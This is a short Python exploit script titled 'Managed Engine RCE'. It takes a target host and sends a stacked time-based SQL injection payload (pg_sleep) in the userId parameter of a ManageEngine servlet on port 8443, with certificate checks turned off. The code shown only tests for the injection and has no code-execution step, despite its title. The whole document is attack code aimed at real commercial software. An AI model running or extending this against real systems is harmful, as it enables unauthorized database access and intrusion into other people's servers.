"""
Author: Aleksa Zatezalo.
Date: September 2024.
Title: Managed Engine RCE.
Description: An RCE for the Manged Engine Web Application via SQL.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def main():
	if len(sys.argv) != 2:
		print("(+) usage %s <target>" % sys.argv[0])
		print ("(+) eg: %s target" % sys.argv[0])
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";select+pg_sleep(10);"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print(r.text)
	print(r.headers)

if __name__ == '__main__':
	main()